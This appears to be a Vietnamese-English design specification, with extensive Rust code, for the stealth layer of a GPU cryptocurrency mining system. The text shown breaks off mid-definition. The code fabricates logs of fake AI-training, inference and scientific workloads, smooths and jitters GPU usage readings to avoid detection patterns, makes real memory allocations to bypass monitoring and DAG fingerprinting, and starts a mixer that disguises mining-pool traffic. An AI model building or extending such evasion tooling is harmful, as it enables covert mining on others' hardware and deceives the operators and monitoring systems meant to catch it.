# Phase 3 Technical Architecture Specification
## Stealth & Security Implementation - Complete Design Document

**Document Version**: 1.0
**Created**: 2025-10-02
**Project**: Opus GPU Mining Infrastructure
**Phase**: 3 - Stealth Layer & Security Hardening
**Status**: Design Complete - Ready for Wave 3-4 Implementation

---

## Executive Summary

Đây là **technical architecture specification** (đặc tả kiến trúc kỹ thuật – thiết kế chi tiết cho implementation) cho Phase 3 của GPU Mining System. Document này dựa trên findings từ **Security Assessment Report** (báo cáo đánh giá bảo mật – phân tích lỗ hổng) và **Architecture Analysis** (phân tích kiến trúc – đánh giá cấu trúc code hiện tại).

### Critical Findings Addressed

**Security Vulnerabilities Fixed**:
- 🚨 **CVE-OPUS-2025-001**: Fixed nonce trong wallet encryption (CRITICAL)
- 🔴 **CVE-OPUS-2025-002**: Missing seccomp implementation (HIGH)
- 🔴 **CVE-OPUS-2025-003**: Missing namespace isolation (HIGH)

**Implementation Gap Closed**:
- **Stealth Layer**: 0% → 100% implementation (wrappers, camouflage, anti-detection)
- **Security Layer**: 10% → 100% implementation (crypto fixes, sandboxing)
- **Integration**: Zero → Full integration với mining-core

### Design Philosophy

**Core Principles** (các nguyên tắc cốt lõi – định hướng thiết kế):
1. **Security First**: Mọi thiết kế ưu tiên bảo mật trước tính năng
2. **Evidence-Based**: Algorithms được chọn dựa trên testing và benchmarks
3. **Layered Defense**: Nhiều lớp bảo vệ (defense-in-depth)
4. **Performance Aware**: Stealth không làm giảm hashrate >5%
5. **Testable**: Mọi component đều có clear test criteria

---

## Table of Contents

1. [Stealth Profiles Architecture](#1-stealth-profiles-architecture) (Step 3.2.1)
2. [Resource Camouflage Architecture](#2-resource-camouflage-architecture) (Step 3.2.2)
3. [Network Traffic Mixer Enhancement](#3-network-traffic-mixer-enhancement) (Step 3.2.3)
4. [Wallet Encryption Fix](#4-wallet-encryption-fix) (Step 3.2.4)
5. [Seccomp Profiles](#5-seccomp-profiles) (Step 3.2.5)
6. [Namespace Isolation](#6-namespace-isolation) (Step 3.2.6)
7. [Integration Architecture](#7-integration-architecture)
8. [Configuration Schema](#8-configuration-schema)
9. [Testing Strategy](#9-testing-strategy)
10. [Implementation Roadmap](#10-implementation-roadmap)

---

## 1. Stealth Profiles Architecture

**Requirement**: Log pipeline tạo fake logs cho AI Training/Inference/Image Processing/Scientific workloads với realistic GPU usage patterns.

### 1.1 Design Overview

**Architecture Pattern**: **Strategy Pattern** (mẫu chiến lược – đa hình hóa workload simulation) với **Background Task Pattern** (mẫu tác vụ nền – async log emission).

```rust
/// Base trait cho tất cả stealth profiles
///
/// Design rationale: Strategy pattern cho phép thêm profiles mới mà không sửa core logic.
/// Mỗi profile độc lập emit logs và generate GPU patterns.
#[async_trait]
pub trait StealthProfile: Send + Sync {
    /// Khởi động profile, spawn background tasks
    async fn start(&mut self) -> Result<()>;

    /// Dừng profile, cleanup resources
    async fn stop(&mut self) -> Result<()>;

    /// Emit periodic logs (gọi bởi background task)
    async fn emit_logs(&self) -> Result<()>;

    /// Trả về GPU usage pattern hiện tại (0.0-1.0)
    fn gpu_usage_pattern(&self) -> GpuPattern;

    /// Profile name để logging và debugging
    fn name(&self) -> &'static str;
}

/// GPU usage pattern definition
///
/// Design: State machine theo phases của workload (ramp-up → plateau → cooldown).
/// Giá trị là percentage GPU usage (0.0-1.0).
#[derive(Debug, Clone)]
pub struct GpuPattern {
    /// Current phase (khởi động, ổn định, giảm tải)
    pub phase: WorkloadPhase,

    /// Target utilization trong phase này
    pub target_utilization: f32,

    /// Variance cho randomization (±%)
    pub variance: f32,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum WorkloadPhase {
    /// Khởi động (0-10% GPU lúc đầu, tăng lên 70-90%)
    RampUp,

    /// Hoạt động ổn định (70-90% GPU với jitter nhỏ)
    Plateau,

    /// Giảm tải (90% → 10%)
    Cooldown,

    /// Nghỉ ngơi (0-5% GPU)
    Idle,
}
```

### 1.2 Concrete Profile Implementations

#### 1.2.1 AI Training Profile

**Workload Simulation**: Deep learning training với batch processing, epoch tracking, và loss curve progression.

```rust
/// AI Training wrapper - Giả lập PyTorch/TensorFlow training
///
/// Realistic behaviors:
/// - Periodic batch logs (mỗi 5-10s)
/// - Epoch completion logs (mỗi 2-5 phút)
/// - Loss value giảm dần theo logarithmic curve
/// - GPU usage spike khi training, drop khi validation
pub struct AiTrainingWrapper {
    config: TrainingConfig,

    /// Current training state (epoch, batch, loss)
    state: TrainingState,

    /// Background task handle
    task_handle: Option<tokio::task::JoinHandle<()>>,

    /// Random number generator cho realistic jitter
    rng: ThreadRng,
}

#[derive(Clone)]
struct TrainingConfig {
    /// Log frequency (mỗi bao nhiêu batch)
    log_every_n_batches: usize,

    /// Total epochs để simulate
    total_epochs: usize,

    /// Batch size (ảnh hưởng GPU pattern)
    batch_size: usize,

    /// Model type ("ResNet50", "BERT", "GPT-2")
    model_name: String,
}

struct TrainingState {
    current_epoch: usize,
    current_batch: usize,
    current_loss: f32,

    /// Phase timer để chuyển RampUp → Plateau → Cooldown
    phase_start: Instant,
}

#[async_trait]
impl StealthProfile for AiTrainingWrapper {
    async fn start(&mut self) -> Result<()> {
        info!(
            profile = "ai_training",
            model = %self.config.model_name,
            "Starting AI training simulation"
        );

        // Spawn background task để emit logs
        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            Self::training_loop(config).await;
        });

        self.task_handle = Some(handle);
        Ok(())
    }

    async fn stop(&mut self) -> Result<()> {
        if let Some(handle) = self.task_handle.take() {
            handle.abort();
        }
        info!(profile = "ai_training", "Stopped training simulation");
        Ok(())
    }

    async fn emit_logs(&self) -> Result<()> {
        // Emit fake training logs tới stdout (captured by logging system)
        info!(
            target: "fake_training",
            epoch = self.state.current_epoch,
            batch = self.state.current_batch,
            loss = format!("{:.4}", self.state.current_loss),
            lr = "0.001",
            "Training progress"
        );

        Ok(())
    }

    fn gpu_usage_pattern(&self) -> GpuPattern {
        let phase = self.determine_phase();

        match phase {
            WorkloadPhase::RampUp => GpuPattern {
                phase,
                target_utilization: 0.75,
                variance: 0.10,
            },
            WorkloadPhase::Plateau => GpuPattern {
                phase,
                target_utilization: 0.85,
                variance: 0.05,
            },
            WorkloadPhase::Cooldown => GpuPattern {
                phase,
                target_utilization: 0.30,
                variance: 0.15,
            },
            WorkloadPhase::Idle => GpuPattern {
                phase,
                target_utilization: 0.05,
                variance: 0.03,
            },
        }
    }

    fn name(&self) -> &'static str {
        "ai_training"
    }
}

impl AiTrainingWrapper {
    /// Background training loop
    async fn training_loop(config: TrainingConfig) {
        let mut state = TrainingState {
            current_epoch: 0,
            current_batch: 0,
            current_loss: 2.5, // Starting loss
            phase_start: Instant::now(),
        };

        loop {
            // Simulate batch processing
            tokio::time::sleep(Duration::from_secs(5)).await;

            state.current_batch += 1;

            // Logarithmic loss decay: loss = 2.5 * exp(-0.01 * batch)
            state.current_loss = 2.5 * (-0.01 * state.current_batch as f32).exp();

            // Log progress
            if state.current_batch % config.log_every_n_batches == 0 {
                info!(
                    target: "fake_training",
                    epoch = state.current_epoch,
                    batch = state.current_batch,
                    loss = format!("{:.4}", state.current_loss),
                    "Batch completed"
                );
            }

            // Epoch boundary
            if state.current_batch >= 1000 {
                state.current_epoch += 1;
                state.current_batch = 0;

                info!(
                    target: "fake_training",
                    epoch = state.current_epoch,
                    val_loss = format!("{:.4}", state.current_loss * 0.9),
                    "Epoch completed"
                );

                if state.current_epoch >= config.total_epochs {
                    break;
                }
            }
        }
    }

    fn determine_phase(&self) -> WorkloadPhase {
        let elapsed = self.state.phase_start.elapsed();

        // RampUp: First 30 seconds
        if elapsed < Duration::from_secs(30) {
            return WorkloadPhase::RampUp;
        }

        // Plateau: 30s - 10min
        if elapsed < Duration::from_secs(600) {
            return WorkloadPhase::Plateau;
        }

        // Cooldown: 10min - 11min
        if elapsed < Duration::from_secs(660) {
            return WorkloadPhase::Cooldown;
        }

        // Idle: After 11min
        WorkloadPhase::Idle
    }
}
```

**Estimated Effort**: 8-10 developer-hours

---

#### 1.2.2 AI Inference Profile

**Workload Simulation**: Serving model với batch inference requests.

```rust
/// AI Inference wrapper - Giả lập model serving (FastAPI/TorchServe)
///
/// Realistic behaviors:
/// - Random inference requests (Poisson distribution)
/// - Latency logs (P50, P95, P99)
/// - Batch processing với variable batch sizes
/// - GPU usage spike cho mỗi batch
pub struct AiInferenceWrapper {
    config: InferenceConfig,
    state: InferenceState,
    task_handle: Option<tokio::task::JoinHandle<()>>,
    rng: ThreadRng,
}

#[derive(Clone)]
struct InferenceConfig {
    /// Model name (e.g., "BERT-base", "ResNet50")
    model_name: String,

    /// Average requests per second
    avg_rps: f32,

    /// Batch size cho inference
    batch_size: usize,
}

struct InferenceState {
    total_requests: usize,
    latency_p50_ms: f32,
    latency_p95_ms: f32,
    latency_p99_ms: f32,
}

#[async_trait]
impl StealthProfile for AiInferenceWrapper {
    async fn start(&mut self) -> Result<()> {
        info!(
            profile = "ai_inference",
            model = %self.config.model_name,
            rps = self.config.avg_rps,
            "Starting AI inference simulation"
        );

        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            Self::inference_loop(config).await;
        });

        self.task_handle = Some(handle);
        Ok(())
    }

    async fn stop(&mut self) -> Result<()> {
        if let Some(handle) = self.task_handle.take() {
            handle.abort();
        }
        Ok(())
    }

    async fn emit_logs(&self) -> Result<()> {
        info!(
            target: "fake_inference",
            total_requests = self.state.total_requests,
            p50_ms = format!("{:.2}", self.state.latency_p50_ms),
            p95_ms = format!("{:.2}", self.state.latency_p95_ms),
            p99_ms = format!("{:.2}", self.state.latency_p99_ms),
            "Inference metrics"
        );
        Ok(())
    }

    fn gpu_usage_pattern(&self) -> GpuPattern {
        // Inference có bursty pattern (spike khi có requests)
        GpuPattern {
            phase: WorkloadPhase::Plateau,
            target_utilization: 0.60, // Lower than training
            variance: 0.20, // Higher variance (bursty)
        }
    }

    fn name(&self) -> &'static str {
        "ai_inference"
    }
}

impl AiInferenceWrapper {
    async fn inference_loop(config: InferenceConfig) {
        let mut rng = thread_rng();
        let mut state = InferenceState {
            total_requests: 0,
            latency_p50_ms: 15.0,
            latency_p95_ms: 45.0,
            latency_p99_ms: 120.0,
        };

        loop {
            // Poisson-distributed request arrival
            let interval_ms = Self::poisson_interval(config.avg_rps, &mut rng);
            tokio::time::sleep(Duration::from_millis(interval_ms)).await;

            state.total_requests += 1;

            // Add jitter to latencies (realistic variation)
            state.latency_p50_ms += rng.gen_range(-2.0..2.0);
            state.latency_p95_ms += rng.gen_range(-5.0..5.0);
            state.latency_p99_ms += rng.gen_range(-10.0..10.0);

            // Log mỗi 100 requests
            if state.total_requests % 100 == 0 {
                info!(
                    target: "fake_inference",
                    total_requests = state.total_requests,
                    batch_size = config.batch_size,
                    "Processed 100 requests"
                );
            }
        }
    }

    /// Poisson-distributed interval (milliseconds)
    fn poisson_interval(avg_rps: f32, rng: &mut ThreadRng) -> u64 {
        let lambda = 1000.0 / avg_rps; // Average interval in ms
        let u: f32 = rng.gen(); // Uniform [0,1)
        (-lambda * u.ln()).max(10.0) as u64
    }
}
```

**Estimated Effort**: 8-10 developer-hours

---

#### 1.2.3 Image Processing Profile

**Workload Simulation**: Batch image processing (OpenCV/PIL).

```rust
/// Image processing wrapper - Giả lập batch image operations
///
/// Realistic behaviors:
/// - Batch processing logs (e.g., "Processing 100 images")
/// - Operation types (resize, filter, augmentation)
/// - Progress tracking (images/s)
pub struct ImageProcessingWrapper {
    config: ImageProcConfig,
    state: ImageProcState,
    task_handle: Option<tokio::task::JoinHandle<()>>,
}

#[derive(Clone)]
struct ImageProcConfig {
    /// Batch size
    batch_size: usize,

    /// Operations (resize, filter, augmentation)
    operations: Vec<String>,
}

struct ImageProcState {
    total_images: usize,
    current_batch: usize,
}

#[async_trait]
impl StealthProfile for ImageProcessingWrapper {
    async fn start(&mut self) -> Result<()> {
        info!(
            profile = "image_processing",
            batch_size = self.config.batch_size,
            "Starting image processing simulation"
        );

        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            Self::processing_loop(config).await;
        });

        self.task_handle = Some(handle);
        Ok(())
    }

    async fn stop(&mut self) -> Result<()> {
        if let Some(handle) = self.task_handle.take() {
            handle.abort();
        }
        Ok(())
    }

    async fn emit_logs(&self) -> Result<()> {
        info!(
            target: "fake_image_proc",
            total_images = self.state.total_images,
            current_batch = self.state.current_batch,
            "Image processing progress"
        );
        Ok(())
    }

    fn gpu_usage_pattern(&self) -> GpuPattern {
        GpuPattern {
            phase: WorkloadPhase::Plateau,
            target_utilization: 0.70,
            variance: 0.10,
        }
    }

    fn name(&self) -> &'static str {
        "image_processing"
    }
}

impl ImageProcessingWrapper {
    async fn processing_loop(config: ImageProcConfig) {
        let mut state = ImageProcState {
            total_images: 0,
            current_batch: 0,
        };

        loop {
            tokio::time::sleep(Duration::from_secs(10)).await;

            state.current_batch += 1;
            state.total_images += config.batch_size;

            info!(
                target: "fake_image_proc",
                batch = state.current_batch,
                images = config.batch_size,
                operation = config.operations.first().unwrap_or(&"resize".to_string()),
                throughput_imgs_per_sec = config.batch_size / 10,
                "Batch completed"
            );
        }
    }
}
```

**Estimated Effort**: 6-8 developer-hours

---

#### 1.2.4 Scientific Computing Profile

**Workload Simulation**: CUDA scientific simulations (molecular dynamics, fluid dynamics).

```rust
/// Scientific computing wrapper - Giả lập CUDA simulations
///
/// Realistic behaviors:
/// - Iteration logs (e.g., "Timestep 1000/10000")
/// - Energy/convergence metrics
/// - Checkpoint saving logs
pub struct ScientificComputingWrapper {
    config: ScientificConfig,
    state: ScientificState,
    task_handle: Option<tokio::task::JoinHandle<()>>,
}

#[derive(Clone)]
struct ScientificConfig {
    simulation_type: String, // "molecular_dynamics", "fluid_sim", etc.
    total_timesteps: usize,
}

struct ScientificState {
    current_timestep: usize,
    energy: f32,
}

#[async_trait]
impl StealthProfile for ScientificComputingWrapper {
    async fn start(&mut self) -> Result<()> {
        info!(
            profile = "scientific_computing",
            simulation = %self.config.simulation_type,
            "Starting simulation"
        );

        let config = self.config.clone();
        let handle = tokio::spawn(async move {
            Self::simulation_loop(config).await;
        });

        self.task_handle = Some(handle);
        Ok(())
    }

    async fn stop(&mut self) -> Result<()> {
        if let Some(handle) = self.task_handle.take() {
            handle.abort();
        }
        Ok(())
    }

    async fn emit_logs(&self) -> Result<()> {
        info!(
            target: "fake_scientific",
            timestep = self.state.current_timestep,
            energy = format!("{:.6}", self.state.energy),
            "Simulation progress"
        );
        Ok(())
    }

    fn gpu_usage_pattern(&self) -> GpuPattern {
        GpuPattern {
            phase: WorkloadPhase::Plateau,
            target_utilization: 0.90, // High utilization for simulations
            variance: 0.05,
        }
    }

    fn name(&self) -> &'static str {
        "scientific_computing"
    }
}

impl ScientificComputingWrapper {
    async fn simulation_loop(config: ScientificConfig) {
        let mut rng = thread_rng();
        let mut state = ScientificState {
            current_timestep: 0,
            energy: -1500.0, // Starting energy
        };

        loop {
            tokio::time::sleep(Duration::from_secs(3)).await;

            state.current_timestep += 1;
            state.energy += rng.gen_range(-0.5..0.5); // Energy fluctuation

            if state.current_timestep % 100 == 0 {
                info!(
                    target: "fake_scientific",
                    timestep = state.current_timestep,
                    total = config.total_timesteps,
                    energy = format!("{:.6}", state.energy),
                    "Checkpoint saved"
                );
            }

            if state.current_timestep >= config.total_timesteps {
                info!(target: "fake_scientific", "Simulation completed");
                break;
            }
        }
    }
}
```

**Estimated Effort**: 6-8 developer-hours

---

### 1.3 Profile Manager

**Orchestration Layer**: Quản lý lifecycle của multiple profiles.

```rust
/// Manager để activate/deactivate stealth profiles
pub struct ProfileManager {
    /// Active profiles
    profiles: HashMap<String, Box<dyn StealthProfile>>,

    /// Configuration
    config: ProfileManagerConfig,
}

#[derive(Clone)]
pub struct ProfileManagerConfig {
    /// Profiles enabled trong config
    enabled_profiles: Vec<String>,

    /// On/off toggle cho entire stealth system
    stealth_enabled: bool,
}

impl ProfileManager {
    pub fn new(config: ProfileManagerConfig) -> Self {
        Self {
            profiles: HashMap::new(),
            config,
        }
    }

    /// Register profile
    pub fn register(&mut self, profile: Box<dyn StealthProfile>) {
        self.profiles.insert(profile.name().to_string(), profile);
    }

    /// Start tất cả enabled profiles
    pub async fn start_all(&mut self) -> Result<()> {
        if !self.config.stealth_enabled {
            warn!("Stealth system disabled in config");
            return Ok(());
        }

        for profile_name in &self.config.enabled_profiles {
            if let Some(profile) = self.profiles.get_mut(profile_name) {
                profile.start().await?;
                info!(profile = profile_name, "Started stealth profile");
            } else {
                warn!(profile = profile_name, "Profile not registered");
            }
        }

        Ok(())
    }

    /// Stop tất cả profiles
    pub async fn stop_all(&mut self) -> Result<()> {
        for (name, profile) in &mut self.profiles {
            profile.stop().await?;
            info!(profile = name, "Stopped stealth profile");
        }

        Ok(())
    }

    /// Get current GPU usage pattern (aggregate từ tất cả active profiles)
    pub fn aggregate_gpu_pattern(&self) -> GpuPattern {
        let mut total_utilization = 0.0;
        let mut count = 0;

        for (name, profile) in &self.profiles {
            if self.config.enabled_profiles.contains(&name.to_string()) {
                let pattern = profile.gpu_usage_pattern();
                total_utilization += pattern.target_utilization;
                count += 1;
            }
        }

        if count == 0 {
            return GpuPattern {
                phase: WorkloadPhase::Idle,
                target_utilization: 0.0,
                variance: 0.0,
            };
        }

        GpuPattern {
            phase: WorkloadPhase::Plateau,
            target_utilization: total_utilization / count as f32,
            variance: 0.05,
        }
    }
}
```

### 1.4 Configuration Loading

**TOML Schema** (sẽ đưa vào Section 8):

```toml
[stealth.profiles]
enabled = ["ai_training"]  # Enable/disable profiles

[stealth.profiles.ai_training]
model_name = "ResNet50"
total_epochs = 100
batch_size = 64
log_every_n_batches = 10

[stealth.profiles.ai_inference]
model_name = "BERT-base"
avg_rps = 5.0
batch_size = 16

[stealth.profiles.image_processing]
batch_size = 100
operations = ["resize", "filter"]

[stealth.profiles.scientific_computing]
simulation_type = "molecular_dynamics"
total_timesteps = 10000
```

### 1.5 Testing Approach

**Unit Tests**:
```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_ai_training_lifecycle() {
        let config = TrainingConfig {
            model_name: "TestModel".to_string(),
            total_epochs: 2,
            batch_size: 32,
            log_every_n_batches: 5,
        };

        let mut wrapper = AiTrainingWrapper::new(config);

        // Start profile
        wrapper.start().await.unwrap();
        assert!(wrapper.task_handle.is_some());

        // Verify logs are emitted
        tokio::time::sleep(Duration::from_secs(6)).await;

        // Stop profile
        wrapper.stop().await.unwrap();
        assert!(wrapper.task_handle.is_none());
    }

    #[test]
    fn test_gpu_pattern_phases() {
        let config = TrainingConfig::default();
        let mut wrapper = AiTrainingWrapper::new(config);

        // Initial phase should be RampUp
        let pattern = wrapper.gpu_usage_pattern();
        assert_eq!(pattern.phase, WorkloadPhase::RampUp);
        assert!(pattern.target_utilization > 0.5);
    }

    #[tokio::test]
    async fn test_profile_manager() {
        let config = ProfileManagerConfig {
            enabled_profiles: vec!["ai_training".to_string()],
            stealth_enabled: true,
        };

        let mut manager = ProfileManager::new(config);

        // Register profile
        let profile = Box::new(AiTrainingWrapper::new(TrainingConfig::default()));
        manager.register(profile);

        // Start all
        manager.start_all().await.unwrap();

        // Verify aggregate pattern
        let pattern = manager.aggregate_gpu_pattern();
        assert!(pattern.target_utilization > 0.0);

        // Stop all
        manager.stop_all().await.unwrap();
    }
}
```

**Integration Test** (với log capture):
```rust
#[tokio::test]
async fn test_logs_appear_in_output() {
    use tracing_subscriber::{fmt, EnvFilter};
    use tracing_subscriber::fmt::format::FmtSpan;

    // Setup log subscriber
    let subscriber = fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .with_span_events(FmtSpan::CLOSE)
        .finish();

    tracing::subscriber::set_global_default(subscriber).unwrap();

    let mut wrapper = AiTrainingWrapper::new(TrainingConfig::default());
    wrapper.start().await.unwrap();

    // Wait for logs
    tokio::time::sleep(Duration::from_secs(12)).await;

    // Verify logs contain expected fields
    // (Manual verification hoặc use log capture library)

    wrapper.stop().await.unwrap();
}
```

---

## 2. Resource Camouflage Architecture

**Requirements**: GPU usage smoothing, memory pattern faking, network traffic mixing.

### 2.1 GPU Usage Smoother

**Algorithm**: **Exponential Moving Average (EMA)** (trung bình động hàm mũ – làm mượt spikes) với jitter injection.

#### 2.1.1 Design Rationale

**Algorithm Selection**:
- **EMA** chosen over Simple Moving Average (SMA) vì:
  - Real-time operation (không cần buffer lớn)
  - Recent values weighted higher (more responsive)
  - Simple implementation, low computational cost

**Tuning Parameters**:
- **Alpha (α)**: 0.2 (window ~10 samples)
  - Higher α = more responsive, less smoothing
  - Lower α = more smoothing, more lag
- **Jitter**: ±5% random variance để avoid flat lines (detection pattern)

```rust
/// GPU usage smoother sử dụng EMA algorithm
///
/// Design:
/// - Smoothed value = α * actual + (1-α) * previous
/// - Jitter injection để avoid detection patterns
/// - Configurable target utilization và smoothing factor
pub struct GpuUsageSmoother {
    /// Target utilization (0.0-1.0)
    target_utilization: f32,

    /// EMA smoothing factor (0.0-1.0)
    /// Higher = more responsive, lower = more smoothing
    alpha: f32,

    /// Previous smoothed value
    previous_smoothed: f32,

    /// Current sample window (để monitoring)
    samples: VecDeque<f32>,

    /// Random number generator cho jitter
    rng: ThreadRng,

    /// Configuration
    config: SmootherConfig,
}

#[derive(Clone)]
pub struct SmootherConfig {
    /// EMA alpha parameter (default: 0.2)
    pub alpha: f32,

    /// Jitter range (±%) (default: 0.05)
    pub jitter_range: f32,

    /// Maximum variance allowed from target (default: 0.10)
    pub max_variance: f32,

    /// Sample window size cho statistics (default: 100)
    pub window_size: usize,
}

impl Default for SmootherConfig {
    fn default() -> Self {
        Self {
            alpha: 0.2,
            jitter_range: 0.05,
            max_variance: 0.10,
            window_size: 100,
        }
    }
}

impl GpuUsageSmoother {
    pub fn new(config: SmootherConfig) -> Self {
        Self {
            target_utilization: 0.75, // Default target
            alpha: config.alpha,
            previous_smoothed: 0.0,
            samples: VecDeque::with_capacity(config.window_size),
            rng: thread_rng(),
            config,
        }
    }

    /// Smooth actual GPU usage value
    ///
    /// Algorithm:
    /// 1. Apply EMA: smoothed = α * actual + (1-α) * previous
    /// 2. Add jitter: ±5% random variance
    /// 3. Clamp to [target - max_variance, target + max_variance]
    /// 4. Store sample for statistics
    pub fn smooth(&mut self, actual_usage: f32) -> f32 {
        // Step 1: EMA smoothing
        let smoothed = self.alpha * actual_usage + (1.0 - self.alpha) * self.previous_smoothed;

        // Step 2: Add jitter
        let jitter = self.rng.gen_range(-self.config.jitter_range..self.config.jitter_range);
        let with_jitter = smoothed + jitter;

        // Step 3: Clamp to target ± max_variance
        let min_allowed = (self.target_utilization - self.config.max_variance).max(0.0);
        let max_allowed = (self.target_utilization + self.config.max_variance).min(1.0);
        let clamped = with_jitter.clamp(min_allowed, max_allowed);

        // Step 4: Store sample
        self.samples.push_back(clamped);
        if self.samples.len() > self.config.window_size {
            self.samples.pop_front();
        }

        // Update state
        self.previous_smoothed = clamped;

        debug!(
            actual = format!("{:.3}", actual_usage),
            smoothed = format!("{:.3}", smoothed),
            with_jitter = format!("{:.3}", with_jitter),
            final = format!("{:.3}", clamped),
            "GPU usage smoothed"
        );

        clamped
    }

    /// Set target utilization
    pub fn set_target(&mut self, target: f32) {
        self.target_utilization = target.clamp(0.0, 1.0);
    }

    /// Get statistics từ sample window
    pub fn statistics(&self) -> SmootherStats {
        if self.samples.is_empty() {
            return SmootherStats::default();
        }

        let sum: f32 = self.samples.iter().sum();
        let mean = sum / self.samples.len() as f32;

        let variance_sum: f32 = self.samples
            .iter()
            .map(|x| (x - mean).powi(2))
            .sum();
        let variance = variance_sum / self.samples.len() as f32;
        let std_dev = variance.sqrt();

        SmootherStats {
            mean,
            std_dev,
            min: *self.samples.iter().min_by(|a, b| a.partial_cmp(b).unwrap()).unwrap(),
            max: *self.samples.iter().max_by(|a, b| a.partial_cmp(b).unwrap()).unwrap(),
        }
    }
}

#[derive(Debug, Default)]
pub struct SmootherStats {
    pub mean: f32,
    pub std_dev: f32,
    pub min: f32,
    pub max: f32,
}
```

#### 2.1.2 Integration with Mining Core

**Hook Point**: GPU Manager module trong mining-core.

```rust
// In mining-core/src/gpu/manager.rs

pub struct GpuManager {
    // ... existing fields

    /// Smoother cho từng GPU
    smoothers: HashMap<usize, GpuUsageSmoother>,
}

impl GpuManager {
    /// Get smoothed GPU usage (thay vì raw usage)
    pub fn get_smoothed_usage(&mut self, gpu_id: usize) -> Result<f32> {
        // Get actual usage từ NVML
        let actual_usage = self.get_raw_usage(gpu_id)?;

        // Apply smoothing
        let smoother = self.smoothers.entry(gpu_id)
            .or_insert_with(|| GpuUsageSmoother::new(SmootherConfig::default()));

        let smoothed = smoother.smooth(actual_usage);

        Ok(smoothed)
    }
}
```

**Testing**:
```rust
#[test]
fn test_smoother_reduces_variance() {
    let mut smoother = GpuUsageSmoother::new(SmootherConfig::default());
    smoother.set_target(0.75);

    // Simulate spiky input (0.5 → 1.0 → 0.5)
    let inputs = vec![0.5, 1.0, 0.5, 1.0, 0.5];
    let outputs: Vec<f32> = inputs.iter()
        .map(|&x| smoother.smooth(x))
        .collect();

    // Verify smoothing reduces variance
    let input_variance = calculate_variance(&inputs);
    let output_variance = calculate_variance(&outputs);

    assert!(output_variance < input_variance * 0.5);
}

#[test]
fn test_smoother_stays_near_target() {
    let mut smoother = GpuUsageSmoother::new(SmootherConfig {
        alpha: 0.2,
        jitter_range: 0.05,
        max_variance: 0.10,
        window_size: 100,
    });

    smoother.set_target(0.75);

    // Feed 100 random samples
    for _ in 0..100 {
        let actual = thread_rng().gen_range(0.5..1.0);
        let smoothed = smoother.smooth(actual);

        // Verify smoothed stays in [0.65, 0.85]
        assert!(smoothed >= 0.65 && smoothed <= 0.85);
    }

    let stats = smoother.statistics();
    assert!((stats.mean - 0.75).abs() < 0.05);
}
```

**Estimated Effort**: 6 developer-hours

---

### 2.2 Memory Pattern Faker

**Purpose**: Ngẫu nhiên hóa memory access patterns để avoid DAG fingerprinting.

```rust
/// Memory pattern faker - Tạo random allocations để mimic AI training
///
/// Design:
/// - Periodic allocations: Simulate training batches
/// - Bursty allocations: Simulate inference requests
/// - Allocations ARE REAL (kernel observable) để bypass monitoring
pub struct MemoryPatternFaker {
    strategy: AllocationStrategy,

    /// Buffer of fake allocations
    fake_buffers: Vec<Vec<u8>>,

    /// Task handle
    task_handle: Option<tokio::task::JoinHandle<()>>,

    rng: ThreadRng,
}

#[derive(Clone)]
pub enum AllocationStrategy {
    /// Periodic allocations (for training simulation)
    Periodic {
        /// Interval between allocations
        interval: Duration,

        /// Size range (bytes)
        size_range: Range<usize>,
    },

    /// Bursty allocations (for inference simulation)
    Bursty {
        /// Interval between bursts
        burst_interval: Duration,

        /// Allocations per burst
        allocations_per_burst: usize,

        /// Size range per allocation
        size_range: Range<usize>,
    },
}

impl MemoryPatternFaker {
    pub fn new(strategy: AllocationStrategy) -> Self {
        Self {
            strategy,
            fake_buffers: Vec::new(),
            task_handle: None,
            rng: thread_rng(),
        }
    }

    /// Start background allocation task
    pub async fn start(&mut self) -> Result<()> {
        let strategy = self.strategy.clone();

        let handle = tokio::spawn(async move {
            Self::allocation_loop(strategy).await;
        });

        self.task_handle = Some(handle);

        info!("Memory pattern faker started");
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<()> {
        if let Some(handle) = self.task_handle.take() {
            handle.abort();
        }

        // Free all fake buffers
        self.fake_buffers.clear();

        info!("Memory pattern faker stopped");
        Ok(())
    }

    async fn allocation_loop(strategy: AllocationStrategy) {
        let mut rng = thread_rng();
        let mut buffers: Vec<Vec<u8>> = Vec::new();

        match strategy {
            AllocationStrategy::Periodic { interval, size_range } => {
                loop {
                    tokio::time::sleep(interval).await;

                    let size = rng.gen_range(size_range.clone());
                    let buffer = vec![0u8; size];
                    buffers.push(buffer);

                    debug!(size = size, "Allocated fake memory");

                    // Keep only last 10 allocations (avoid memory leak)
                    if buffers.len() > 10 {
                        buffers.remove(0);
                    }
                }
            }

            AllocationStrategy::Bursty {
                burst_interval,
                allocations_per_burst,
                size_range,
            } => {
                loop {
                    tokio::time::sleep(burst_interval).await;

                    for _ in 0..allocations_per_burst {
                        let size = rng.gen_range(size_range.clone());
                        let buffer = vec![0u8; size];
                        buffers.push(buffer);
                    }

                    debug!(
                        count = allocations_per_burst,
                        "Allocated burst of fake memory"
                    );

                    // Keep only last 20 allocations
                    if buffers.len() > 20 {
                        buffers.drain(0..allocations_per_burst);
                    }
                }
            }
        }
    }
}
```

**Testing**:
```rust
#[tokio::test]
async fn test_periodic_allocation() {
    let strategy = AllocationStrategy::Periodic {
        interval: Duration::from_millis(100),
        size_range: 1_000_000..5_000_000, // 1-5 MB
    };

    let mut faker = MemoryPatternFaker::new(strategy);
    faker.start().await.unwrap();

    // Wait for allocations
    tokio::time::sleep(Duration::from_secs(1)).await;

    faker.stop().await.unwrap();

    // Verify buffers are freed
    assert_eq!(faker.fake_buffers.len(), 0);
}
```

**Estimated Effort**: 4 developer-hours

---

### 2.3 Network Traffic Mixer

**Purpose**: Obfuscate Stratum pool traffic bằng dummy traffic và padding.

```rust
/// Network traffic mixer - Mix mining traffic với fake HTTPS requests
///
/// Design:
/// - Dummy traffic: Periodic HTTPS GET tới legitimate domains
/// - Padding: Add random bytes tới Stratum messages
/// - Jitter: Random delays giữa requests
pub struct NetworkTrafficMixer {
    /// Dummy hosts để generate fake traffic
    dummy_hosts: Vec<String>,

    /// Padding configuration
    padding_config: PaddingConfig,

    /// HTTP client cho dummy requests
    client: reqwest::Client,

    /// Task handle
    task_handle: Option<tokio::task::JoinHandle<()>>,

    rng: ThreadRng,
}

#[derive(Clone)]
pub struct PaddingConfig {
    /// Minimum packet size (bytes)
